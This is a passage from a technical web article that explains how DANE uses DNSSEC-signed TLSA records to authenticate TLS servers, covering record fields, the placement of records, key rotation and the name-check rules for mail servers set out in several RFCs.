(as long as we ignore <a href="https://en.wikipedia.org/wiki/Extended_Validation_Certificate">extended-validation certificates</a>,
which also assert the legal name of the domain owner).
<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> gets rid of this additional loop
by letting you publish the public key of your server instead of a nonce at your domain
and letting clients do the domain validation themselves
instead of relying on a certification authority to do this for them.
While you no longer have to pay for <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> certificates thanks to <a href="https://letsencrypt.org/">Let’s Encrypt</a>,
you can configure <code>TLSA</code> records for your servers at no additional costs
(as long as your <a href="https://en.wikipedia.org/wiki/Domain_name_registrar">domain name registrar</a>
supports <abbr title="Domain Name System Security Extensions">DNSSEC</abbr> at no additional costs).</li>
    <li><strong>Clear domain bindings</strong>:
As we will see <a href="#name-checks">soon</a>,
there are various ways to include domain names in <a href="https://en.wikipedia.org/wiki/X.509"><abbr title="A standard defining the format of public key certificates">X.509</abbr> certificates</a>.
While <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> supports <a href="#tlsa-record-type">different modes of operation</a> and inherits the problem in some of them,
it paves the way for a truly simple domain-based public-key infrastructure.
Instead of having to <a href="https://en.wikipedia.org/wiki/Server_Name_Indication">indicate the right name to the server</a>
and to intersect the set of certified domain names with the set of acceptable domain names,
<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> clients can just compare the server’s public key with its <code>TLSA</code> records.
Complexity is not just the enemy of security,
it also leads to partial implementations of a standard,
which in turn leads to a mess of incompatibilities.</li>
    <li><strong>Cached intermediate certificates</strong>:
<abbr title="Transport Layer Security">TLS</abbr> servers send their certificate with all
<a href="https://en.wikipedia.org/wiki/Public_key_certificate#Intermediate_certificate">intermediate certificates</a>
each time a client connects to them unless the client uses a
<a href="https://en.wikipedia.org/wiki/Transport_Layer_Security#Resumed_TLS_handshake">resumed <abbr title="Transport Layer Security">TLS</abbr> handshake</a>
or the cached information extension as specified in <a href="https://datatracker.ietf.org/doc/html/rfc7924"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7924</a>.
In the case of <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>, a client fetches the chain of public-key assertions to the root zone separately through the <abbr title="Domain Name System">DNS</abbr>,
which has the advantage that they are automatically <a href="https://en.wikipedia.org/wiki/Cache_(computing)">cached</a>.
One downside of this is that you have to publish new <code>TLSA</code> records at least
<a href="https://datatracker.ietf.org/doc/html/rfc7671#section-8.1">one validity period before using the corresponding keys</a>.</li>
    <li><strong>Key revocation</strong>:
Due to their complicated issuance, <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> certificates are usually valid for months or years.
If a <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> key is compromised, you can revoke the corresponding certificate only for clients who support either
<a href="https://en.wikipedia.org/wiki/Certificate_revocation_list">Certificate Revocation Lists (<abbr title="Certificate Revocation List">CRL</abbr>)</a>
as specified in <a href="https://datatracker.ietf.org/doc/html/rfc5280#section-5"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5280</a>
or the <a href="https://en.wikipedia.org/wiki/Online_Certificate_Status_Protocol">Online Certificate Status Protocol (<abbr title="Online Certificate Status Protocol">OCSP</abbr>)</a>
as specified in <a href="https://datatracker.ietf.org/doc/html/rfc6960"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6960</a>.
<abbr title="Domain Name System Security Extensions">DNSSEC</abbr> signatures, on the other hand, are valid until they expire and cannot be revoked.
While you can remove a compromised <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> key immediately from your <abbr title="Domain Name System">DNS</abbr> zone,
an attacker can replay the signed <code>TLSA</code> records until the <code>RRSIG</code> signature expires.
For this reason, the validity of <abbr title="Domain Name System Security Extensions">DNSSEC</abbr> signatures should be
<a href="https://datatracker.ietf.org/doc/html/rfc7671#section-11">in the order of days or at most weeks</a>.
If you cannot ensure that your zone is signed reliably in relatively short intervals,
you should deploy neither <abbr title="Domain Name System Security Extensions">DNSSEC</abbr> nor <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>.</li>
  </ul>

  <p>It’s important to note that <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> changes only how <abbr title="Transport Layer Security">TLS</abbr> clients verify server certificates.
<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> also uses <a href="https://en.wikipedia.org/wiki/X.509"><abbr title="A standard defining the format of public key certificates">X.509</abbr> certificates</a>,
and no modifications are needed in <abbr title="Transport Layer Security">TLS</abbr> server software.</p>

</details>

<details>
  <summary id="tlsa-record-type">
<abbr title="TLSA is not an acronym but rather the name of a resource record type.">TLSA</abbr> record type
</summary>

  <p>The <code>TLSA</code> record type is specified in <a href="https://datatracker.ietf.org/doc/html/rfc6698#section-2"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6698</a>.
A <code>TLSA</code> record consists of the following four fields:</p>
  <ol>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc6698#section-2.1.1"><strong>Certificate usage</strong></a>:
This field captures two separate pieces of information in a single number.
On the one hand, the number indicates whether the certificate referenced by the <code>TLSA</code> record
belongs to a trust anchor, which certified the public key and the identity of the end entity,
or to the end entity, i.e. the server to which the client wants to connect.
On the other hand, the number also indicates whether a
<a href="https://en.wikipedia.org/wiki/Certification_path_validation_algorithm">valid path</a>
to a <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> certification authority which is trusted by the <abbr title="Transport Layer Security">TLS</abbr> client has to exist
or whether the certificate is to be trusted just because it is referenced in the <code>TLSA</code> record.
These certificate usages apply only to <a href="https://en.wikipedia.org/wiki/X.509"><abbr title="A standard defining the format of public key certificates">X.509</abbr> certificates</a>
in <a href="https://en.wikipedia.org/wiki/X.690#DER_encoding">DER encoding</a>.
      <figure>
        <table>
          <thead>
            <tr>
              <th>Verification</th>
              <th>Trust anchor</th>
              <th>End entity</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><strong><abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> &amp; <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr></strong></td>
              <td><abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr>-<abbr title="Trust Anchor">TA</abbr> (0)</td>
              <td><abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr>-<abbr title="End Entity">EE</abbr> (1)</td>
            </tr>
            <tr>
              <td><strong><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr></strong></td>
              <td><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-<abbr title="Trust Anchor">TA</abbr> (2)</td>
              <td><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-<abbr title="End Entity">EE</abbr> (3)</td>
            </tr>
          </tbody>
        </table>
        <figcaption>
The four certificate usages with the acronyms as introduced in <a href="https://datatracker.ietf.org/doc/html/rfc7218"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7218</a>.
</figcaption>
      </figure>
    </li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc6698#section-2.1.2"><strong>Selector</strong></a>:
This field specifies which part of the certificate is referenced by the <code>TLSA</code> record.
The possible values are <code>0</code> for the full certificate and <code>1</code> for the
<a href="https://en.wikipedia.org/wiki/X.509#Structure_of_a_certificate">SubjectPublicKeyInfo (<abbr title="SubjectPublicKeyInfo (a binary structure of X.509 certificates)">SPKI</abbr>)</a>,
which consists of the public-key algorithm and the subject’s public key.
The latter does not cover the names of the issuer and the subject, the validity period,
or any <a href="https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.1.9">certification constraints</a>.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc6698#section-2.1.3"><strong>Matching type</strong></a>:
This field specifies how the selected content is presented in the certificate association field.
<code>0</code> means that the selected content is included as is in the last field,
<code>1</code> means that the certificate association data is the <a href="#secure-hash-algorithms"><abbr title="Secure Hash Algorithm">SHA</abbr>-256 hash</a>
of the selected content, and <code>2</code> means that the <a href="#secure-hash-algorithms"><abbr title="Secure Hash Algorithm">SHA</abbr>-512 hash</a> is used instead.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc6698#section-2.1.4"><strong>Certificate association data</strong></a>:
This field contains the data which the certificate has to match according to the values
in the selector and matching type fields.</li>
  </ol>

  <p><code>TLSA</code> records have <a href="https://datatracker.ietf.org/doc/html/rfc6698#section-2.1">a binary format</a>.
The first three fields are unsigned 8-bit integers,
where <code>255</code> is reserved for private use and the remaining values are unassigned.
<a href="https://en.wikipedia.org/wiki/Internet_Assigned_Numbers_Authority"><abbr title="Internet Assigned Numbers Authority">IANA</abbr></a>
maintains a <a href="https://www.iana.org/assignments/dane-parameters/dane-parameters.xhtml">registry for these parameters</a>.
The certificate association field <a href="https://datatracker.ietf.org/doc/html/rfc6698#section-2.2">has to be represented</a>
as a string of <a href="https://evalapply.org/internet/#number-encoding">hexadecimal characters</a>.
Here is an example:</p>

  <figure>

    <div><div><pre><code>3 1 1 76bb66711da416433ca890a5b2e5a0533c6006478f7d10a4469a947acc8399e1
</code></pre></div>    </div>

    <figcaption>

One of the <code>TLSA</code> records at <code>_25._tcp.mail.protonmail.ch</code>.
(I cover the location of the record in the <a href="#tlsa-record-location">next box</a>.)

</figcaption>
  </figure>

  <p><a href="https://datatracker.ietf.org/doc/html/rfc7671#section-5"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7671</a> specifies how <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> clients must verify
the server’s certificate depending on the certificate usage of the server’s <code>TLSA</code> record.
As you can see in the table below, clients ignore all information from the server’s certificate
except the SubjectPublicKeyInfo in the case of <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-<abbr title="End Entity">EE</abbr>.
In particular, the certificate can be issued for any name,
and the certificate is accepted even if it has expired.
Since the certificate belongs to the end entity itself,
it doesn’t have to have a valid certificate chain.
In the case of the other certificate usages, certification constraints, such as
<a href="https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.1.9">maximum path length</a> and
<a href="https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.1.10">namespace restrictions</a>, have to be verified.
If a server hosts the service for different customers under several domain names,
it should support the <abbr title="Transport Layer Security">TLS</abbr> extension <a href="https://en.wikipedia.org/wiki/Server_Name_Indication">Server Name Indication (SNI)</a>
in order to return the right certificate chain to each client.</p>

  <figure>

    <table>
      <thead>
        <tr>
          <th>Requirements</th>
          <th><a href="https://datatracker.ietf.org/doc/html/rfc7671#section-5.4"><abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr>-<abbr title="Trust Anchor">TA</abbr></a></th>
          <th><a href="https://datatracker.ietf.org/doc/html/rfc7671#section-5.3"><abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr>-<abbr title="End Entity">EE</abbr></a></th>
          <th><a href="https://datatracker.ietf.org/doc/html/rfc7671#section-5.2"><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-<abbr title="Trust Anchor">TA</abbr></a></th>
          <th><a href="https://datatracker.ietf.org/doc/html/rfc7671#section-5.1"><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-<abbr title="End Entity">EE</abbr></a></th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><a href="#name-checks"><strong>Name matching</strong></a></td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td><strong>Expiration date</strong></td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td><strong>Certificate chain</strong></td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td><strong>Certification constraints</strong></td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td><a href="https://en.wikipedia.org/wiki/Server_Name_Indication"><strong>Server Name Indication (SNI)</strong></a></td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
      </tbody>
    </table>

    <figcaption>

Which checks clients have to perform for each certificate usage
according to <a href="https://datatracker.ietf.org/doc/html/rfc7671#section-5"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7671</a>.

</figcaption>
  </figure>

  <p>Given that <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-<abbr title="End Entity">EE</abbr> uses almost none of the information in the certificate,
<a href="https://datatracker.ietf.org/doc/html/rfc7250"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7250</a> specifies a <abbr title="Transport Layer Security">TLS</abbr> extension
to use just the raw public key instead of the complete certificate of the server
during the <a href="https://en.wikipedia.org/wiki/Transport_Layer_Security#TLS_handshake">handshake</a>.
For the same reason, it is recommended to combine a certificate usage of <code>3</code> (<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-<abbr title="End Entity">EE</abbr>) with a selector of <code>1</code> (<abbr title="SubjectPublicKeyInfo (a binary structure of X.509 certificates)">SPKI</abbr>).
On the other hand, the selector should be <code>0</code> to match the full certificate
if the <code>TLSA</code> record references the certificate of a trust anchor with <code>2</code> (<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-<abbr title="Trust Anchor">TA</abbr>)
so that any certification constraints are also covered by the <code>TLSA</code> record.
The certificate usages <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr>-<abbr title="End Entity">EE</abbr> and <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr>-<abbr title="Trust Anchor">TA</abbr> provide more security
only if an <a href="https://evalapply.org/internet/#application-layer">application layer protocol</a>
forbids the certificate usages <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-<abbr title="End Entity">EE</abbr> and <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-<abbr title="Trust Anchor">TA</abbr>.
Otherwise, an attacker who compromised the <abbr title="Domain Name System">DNS</abbr> zone can simply change the certificate usage to <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-<abbr title="End Entity">EE</abbr> or <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-<abbr title="Trust Anchor">TA</abbr>
in order to <a href="https://datatracker.ietf.org/doc/html/rfc7671#section-4">bypass the additional <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> verification</a>.</p>

  <figure>

    <table>
      <thead>
        <tr>
          <th>Recommendation</th>
          <th>Certificate usage</th>
          <th>Selector</th>
          <th>Matching type</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc7672#section-3.1"><strong>SHOULD</strong></a></td>
          <td><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-<abbr title="End Entity">EE</abbr> (3)</td>
          <td><abbr title="SubjectPublicKeyInfo (a binary structure of X.509 certificates)">SPKI</abbr> (1)</td>
          <td><abbr title="Secure Hash Algorithm">SHA</abbr>-256 (1)</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc7672#section-3.1"><strong>MAY</strong></a></td>
          <td><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-<abbr title="Trust Anchor">TA</abbr> (2)</td>
          <td>Full (0)</td>
          <td><abbr title="Secure Hash Algorithm">SHA</abbr>-256 (1)</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc7671#section-10.1.2"><strong>SHOULD NOT</strong></a></td>
          <td>–</td>
          <td>–</td>
          <td>Complete (0)</td>
        </tr>
      </tbody>
      <tbody>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc7672#section-3.1.3"><strong>SHOULD NOT</strong></a></td>
          <td><abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr>-<abbr title="End Entity">EE</abbr> (1)</td>
          <td>–</td>
          <td>–</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc7672#section-3.1.3"><strong>SHOULD NOT</strong></a></td>
          <td><abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr>-<abbr title="Trust Anchor">TA</abbr> (0)</td>
          <td>–</td>
          <td>–</td>
        </tr>
      </tbody>
    </table>

    <figcaption>

Which combinations of <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> parameters you should and should not use.</figcaption>
  </figure>

  <p>The advantage of <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-<abbr title="Trust Anchor">TA</abbr> over <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-<abbr title="End Entity">EE</abbr> is that
certificates can be updated without having to change the <code>TLSA</code> records.
When using <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-<abbr title="Trust Anchor">TA</abbr>, the server should include the certificate of the trust anchor
in its chain of intermediate certificates, which is sent to connecting clients.
Otherwise, clients cannot verify the server certificate
unless the parameters are <code>2 0 0</code>, which is not recommended.</p>

</details>

<details>
  <summary id="tlsa-record-location">
<abbr title="TLSA is not an acronym but rather the name of a resource record type.">TLSA</abbr> record location
</summary>

  <p>In order to keep the <code>TLSA</code> records of different services apart,
they are <a href="https://datatracker.ietf.org/doc/html/rfc6698#section-3">stored at a subdomain</a>,
which includes the <a href="https://evalapply.org/internet/#port-numbers">port number</a>
and the <a href="https://evalapply.org/internet/#transport-layer">transport layer protocol</a> of the service:
<code>_{PortNumber}._{TransportProtocol}.{ProviderDomain}</code>.
While the <code>TransportProtocol</code> is usually <code>tcp</code>,
it can also be <code>udp</code> in the case of
<a href="https://en.wikipedia.org/wiki/Datagram_Transport_Layer_Security">Datagram Transport Layer Security (<abbr title="Datagram Transport Layer Security">DTLS</abbr>)</a>
or <code>sctp</code> in the case of the
<a href="https://en.wikipedia.org/wiki/Stream_Control_Transmission_Protocol">Stream Control Transmission Protocol (<abbr title="Stream Control Transmission Protocol">SCTP</abbr>)</a>.
For example, the Dutch <a href="https://internet.nl">Internet Standards Platform</a>
has a <code>TLSA</code> record for <a href="#extended-simple-mail-transfer-protocol"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr></a> at <code>_25._tcp.internet.nl</code>
and a <code>TLSA</code> record for <a href="https://evalapply.org/internet/#hypertext-transfer-protocol"><abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr></a> at <code>_443._tcp.internet.nl</code>.</p>

  <p>The <code>ProviderDomain</code> is the hostname of the server which actually provides the service.
It is determined by resolving <code>CNAME</code> records to the canonical domain
and following service-specific records, such as <code>MX</code> and <code>SRV</code> records.
Requiring the <code>TLSA</code> record to be located at the <code>ProviderDomain</code> has three advantages:</p>
  <ul>
    <li><strong>Easier certificate changes</strong>:
By having the service provider configure the <code>TLSA</code> record at their domain,
they can change the server certificates without involving their customers.</li>
    <li><strong>No unnecessary records</strong>:
Such a delegation of authority is also possible with <code>CNAME</code> records,
but this would require domain owners to point to each of their service providers twice:
once for the hostname of the server and once for the <code>TLSA</code> record of the server.
Requiring clients to resolve <abbr title="Domain Name System">DNS</abbr> indirections before making the <code>TLSA</code> lookup avoids this duplication.
In the example above, both <code>_25._tcp.internet.nl</code> and <code>_443._tcp.internet.nl</code>
point to a different domain name with a <code>CNAME</code> record.
(The <code>TLSA</code> record for <abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> is at <code>_25._tcp.internet.nl</code>
only because <code>internet.nl</code> points its <code>MX</code> record to itself.)</li>
    <li><strong>Easier virtual hosting</strong>:
The <code>ProviderDomain</code> is also used for verifying the <a href="#name-checks">subject of the certificate</a>.
By using the domain of the provider rather than the customer,
the service provider can use a single certificate for an arbitrary number of customers.
Otherwise, the service provider would have to obtain a separate certificate for each customer.
Since <a href="https://en.wikipedia.org/wiki/X.509"><abbr title="A standard defining the format of public key certificates">X.509</abbr> certificates</a> are not constrained to a single service such as email,
this is not just undesirable from an operational perspective but also from a security perspective
because your mailbox provider could intercept your Web traffic with the certificate for your domain.</li>
  </ul>

  <p>A disadvantage of this approach is that it’s up to your service provider to support <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>,
whereas you can deploy <a href="#mail-transfer-agent-strict-transport-security"><abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr></a> yourself
if your service provider uses a certificate issued by a widely accepted certification authority.
Another consequence of domain-based transport security is that <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> and <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr>
cannot be used with <a href="#address-syntax">address literals</a>, such as <code>user@[192.0.2.1]</code>.</p>

</details>

<details>
  <summary id="multiple-tlsa-records">
Multiple <abbr title="TLSA is not an acronym but rather the name of a resource record type.">TLSA</abbr> records
</summary>

  <p>A server can have several <code>TLSA</code> records, and its certificate has to be authenticated by just one of them.
There are two situations in which you want to use multiple <code>TLSA</code> records:</p>
  <ol>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc7671#section-8.1"><strong>Key rotation</strong></a>:
Cryptographic keys have to be replaced from time to time.
Since it takes <a href="https://en.wikipedia.org/wiki/Time_to_live">some time</a>
for new records to propagate through the Domain Name System,
the <code>TLSA</code> record for a new key has to be published at least one validity period before it can be used.
The <code>TLSA</code> record for the old key/certificate can be removed only once the new key is being used.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc7671#section-9"><strong>Algorithm agility</strong></a>:
<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> clients don’t have to support all <a href="#tlsa-record-type"><code>TLSA</code> parameters</a> and combinations thereof.
A service provider can publish several <code>TLSA</code> records with different parameters for the same key/certificate,
which allows <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> clients to rely on the strongest <code>TLSA</code> record which they can use.
For example, <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> clients <a href="https://datatracker.ietf.org/doc/html/rfc6698#section-6">should but don’t have to support <abbr title="Secure Hash Algorithm">SHA</abbr>-512</a>.
If <a href="#secure-hash-algorithms"><abbr title="Secure Hash Algorithm">SHA</abbr>-256</a> is deprecated at some point in the future,
service providers can publish the same key/certificate in <code>TLSA</code> records
with a <a href="#tlsa-record-type">matching type</a> of <code>1</code> (<abbr title="Secure Hash Algorithm">SHA</abbr>-256) and <code>2</code> (<abbr title="Secure Hash Algorithm">SHA</abbr>-512).
Clients which support the latter will use the latter record,
all the others will continue to use the former one.
<a href="https://datatracker.ietf.org/doc/html/rfc7671#section-8"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7671</a> requires that
each published combination of <code>TLSA</code> parameters covers the certificate chain in use
so that <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> clients can <a href="#client-behavior">abort the connection</a>
if the server cannot be authenticated with one of the usable <code>TLSA</code> records.</li>
  </ol>

</details>

<details>
  <summary id="name-checks">
Name checks
</summary>

  <p>If a <a href="#tlsa-record-type">certificate usage</a> other than <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-<abbr title="End Entity">EE</abbr> is being used,
<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> clients have to verify that the validated certificate matches the server’s identity.
In order to do so, they carry out the following procedure:</p>
  <ol>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc7672#section-2.2.2"><strong>Determine the <code>TLSA</code> domain</strong></a>:
The <code>TLSA</code> lookup is usually performed on the server’s domain
after resolving any <code>CNAME</code>, <code>MX</code>, and <code>SRV</code> records.
<a href="https://datatracker.ietf.org/doc/html/rfc7672#section-2.2.2"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7672</a>, however,
makes things a bit more complicated for <a href="#extended-simple-mail-transfer-protocol"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr></a>.
In a first step, the domain found after the <code>@</code> symbol in the email address is <code>CNAME</code>-expanded.
If the whole expansion was <a href="#client-behavior">secure</a>, you look up its <code>MX</code> records.
Any domain name listed in an <code>MX</code> record has to resolve directly to <code>A</code>/<code>AAAA</code> records
according to <a href="https://datatracker.ietf.org/doc/html/rfc2181#section-10.3"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2181</a>
and <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-5.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5321</a>.
(Some mail servers support <code>CNAME</code> expansion of the <code>MX</code> domain,
but I decided not to cover this case for the sake of simplicity.)
If the expanded <code>@</code> domain has no <code>MX</code> records,
you <a href="#address-resolution">fall back to its <code>A</code>/<code>AAAA</code> records</a>.
The <code>TLSA</code> domain is determined as follows:
      <figure>
        <table>
          <thead>
            <tr>
              <th>Non-expanded <code>@</code> domain</th>
              <th>Expanded <code>@</code> domain</th>
              <th><code>MX</code> domain</th>
              <th><code>TLSA</code> domain</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>Secure <code>CNAME</code> record</td>
              <td>Secure <code>MX</code> records</td>
              <td>Secure <code>A</code>/<code>AAAA</code></td>
              <td><code>MX</code> domain <i></i></td>
            </tr>
            <tr>
              <td>Secure <code>CNAME</code> record</td>
              <td>Secure <code>A</code>/<code>AAAA</code></td>
              <td>–</td>
              <td>Expanded <code>@</code> domain <i></i></td>
            </tr>
            <tr>
              <td>Secure <code>CNAME</code> record,</td>
              <td>Secure or insecure</td>
              <td>–</td>
              <td>Non-expanded <code>@</code> domain <i></i></td>
            </tr>
            <tr>
              <td>Secure <code>MX</code> records</td>
              <td>–</td>
              <td>Secure <code>A</code>/<code>AAAA</code></td>
              <td><code>MX</code> domain <i></i></td>
            </tr>
            <tr>
              <td>Insecure <code>MX</code> records</td>
              <td>(Before or after</td>
              <td>Secure <code>A</code>/<code>AAAA</code></td>
              <td><code>MX</code> domain <i></i></td>
            </tr>
            <tr>
              <td>Secure <code>A</code>/<code>AAAA</code></td>
              <td>–</td>
              <td>–</td>
              <td>Non-expanded <code>@</code> domain <i></i></td>
            </tr>
          </tbody>
        </table>
        <figcaption>
The <code>TLSA</code> domain is where the <code>TLSA</code> records were found.
In all other cases, <a href="#client-behavior"><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> does not apply</a>.
I’ve marked the unexpected cases, where the <code>TLSA</code> domain is not the rightmost domain
or where <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> may be used even if the <code>@</code> domain is insecure,
with<i></i>.
</figcaption>
      </figure>
    </li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc7672#section-3.2.2"><strong>Determine the set of acceptable domains</strong></a>:
<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> clients accept a certificate issued for the <code>TLSA</code> domain or any domain to its left in the above table.
In the first case, the set of acceptable domains consists of
the <code>MX</code> domain, the expanded <code>@</code> domain, and the non-expanded <code>@</code> domain.
<a href="https://datatracker.ietf.org/doc/html/rfc7672#section-2.2.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7672</a> allows <abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> clients to use <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>
even if the <code>MX</code> records were in a zone whose records aren’t authenticated with <abbr title="Domain Name System Security Extensions">DNSSEC</abbr>.
In this second last case according to the above table, the <code>MX</code> domain is the only acceptable domain.
Accepting the <code>@</code> domain in all other cases allows different <code>MX</code> hosts to use the same certificate.
Since the <code>MX</code> records couldn’t be trusted before <abbr title="Domain Name System Security Extensions">DNSSEC</abbr>,
pre-<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> <abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> clients often look for the <code>@</code> domain in server certificates.
Requiring <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-capable <abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> clients to accept the <code>@</code> domain as well helps with backward compatibility.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc7672#section-3.2.3"><strong>Determine the set of certified domains</strong></a>:
In order to receive the right certificate chain from the server,
<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> clients <a href="https://datatracker.ietf.org/doc/html/rfc7672#section-8.1">have to send the <code>TLSA</code> domain</a> to the server
with the <a href="https://en.wikipedia.org/wiki/Server_Name_Indication">Server Name Indication (SNI)</a> extension.
The server certificate can have several domain names in the
<a href="https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.1.6">Subject Alternative Name (SAN) field</a>.
Only if this field contains no domain names,
clients may consider the subject’s <a href="https://datatracker.ietf.org/doc/html/rfc6125#section-1.8">Common Name (CN)</a>.
<a href="https://datatracker.ietf.org/doc/html/rfc6125#section-2.3"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6125</a>
goes into more detail about subject naming in <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> certificates.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc7672#section-3.2.3"><strong>Intersect the set of certified domains with the set of acceptable domains</strong></a>:
The certificate matches the server’s identity
if one of the acceptable domains is included in the set of certified domains.
Even this step is not trivial as the certified domains may have the
